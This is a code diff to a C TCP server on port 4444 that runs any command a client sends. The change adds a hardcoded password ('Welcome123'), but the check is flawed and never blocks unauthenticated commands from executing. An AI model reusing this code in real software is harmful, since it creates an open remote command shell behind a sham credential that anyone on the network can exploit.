@@ -8,6 +8,7 @@
 #include <arpa/inet.h>
 #include <time.h>
 #include "executor.h" //Added
+#include <stdbool.h>
 
 #define PORT 4444
 
@@ -31,6 +32,7 @@ int main(){
 
 	char buffer[1024];
 	pid_t childpid;
+	bool waitingForPassword = true;
 
 	sockfd = socket(AF_INET, SOCK_STREAM, 0);
 	if(sockfd < 0){
@@ -70,10 +72,21 @@ int main(){
 
 			while(1){
 				recv(newSocket, buffer, 1024, 0);
+				if(waitingForPassword)
+				{
+					printf("Password Received\n");
+				}
+
 				if(strcmp(buffer, ":exit\n") == 0){
 					printf("Disconnected from %s:%d\n", inet_ntoa(newAddr.sin_addr), ntohs(newAddr.sin_port));
 					break;
-				}else{
+				}
+				else if((strcmp(buffer, "Welcome123") == 0) && waitingForPassword)
+				{
+					printf("Password okay\n");
+					waitingForPassword = false;
+				}
+				else{
 					printf("Command received from client: %s", buffer);
 					printf("Executing command...\n");
 					cmd_output = (FILE *) executor(buffer);
